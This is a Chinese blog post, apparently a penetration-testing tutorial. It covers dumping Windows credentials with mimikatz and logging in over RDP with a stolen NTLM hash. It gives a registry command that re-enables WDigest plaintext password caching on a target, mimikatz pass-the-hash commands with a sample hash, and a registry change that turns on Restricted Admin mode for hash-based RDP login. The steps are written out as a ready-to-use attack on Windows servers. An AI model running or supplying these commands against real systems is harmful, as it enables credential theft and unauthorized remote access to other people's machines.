我们知道在Windows Server2012及其以后的版本中，使用mimikatz在[内存](https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020)中抓取不到明文密码了，这是微软为了防止内存中泄露明文密码做的一个安全措施。

![](https://img-blog.csdnimg.cn/20210420211432429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

但是修改[注册表](https://so.csdn.net/so/search?q=%E6%B3%A8%E5%86%8C%E8%A1%A8&spm=1001.2101.3001.7020)后重启依然可以抓取到明文密码，执行如下命令，等待目标机器重启后使用mimikatz即可抓取到明文密码

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```


![](https://img-blog.csdnimg.cn/20210420204456668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210420205014702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

但是实际环境中是不可能重启目标主机的。这里假设我们抓取到了administrator用户的哈希，想利用该哈希以administrator用户的身份[RDP](https://so.csdn.net/so/search?q=RDP&spm=1001.2101.3001.7020)登录主机，该如何操作呢。

前面我们提到，微软为了防止在Windows Server 2012 R2及其以上版本的Windows系统内存中抓到明文密码，采取了一定的安全措施。但是该安全措施却造成了`RDP`的`pth`攻击。Windows Server 2012 R2及其以上版本的Windows系统的远程桌面服务支持 `Restricted Admin mode。`也就是使用当前账户的[hash](https://so.csdn.net/so/search?q=hash&spm=1001.2101.3001.7020)凭据来登录远程桌面，无需输入明文密码。官方文档：[Restricted Admin mode for RDP in Windows 8.1 / 2012 R2 | Microsoft Docs](https://blogs.technet.microsoft.com/kfalde/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2/ "Restricted Admin mode for RDP in Windows 8.1 / 2012 R2 | Microsoft Docs")

我们需要在Windows Server 2012 R2及其以上版本的Windows系统中以管理员权限执行如下命令：

```
privilege::debug      
sekurlsa::pth /user:administrator /domain:10.211.55.4 /ntlm:329153f560eb329c0e1deea55e88a1e9 "/run:mstsc.exe /restrictedadmin"
```


![](https://img-blog.csdnimg.cn/20210420212258475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果目标机器没有开启`Restricted Admin mode的话，可以执行如下命令开启：`

```
REG ADD HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
```


注：注入的哈希用户需要是目标机器的本地管理员 

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[攻击3389之PTH](https://mp.weixin.qq.com/s/mVSc5geSYwncpOda1OT-0g "攻击3389之PTH")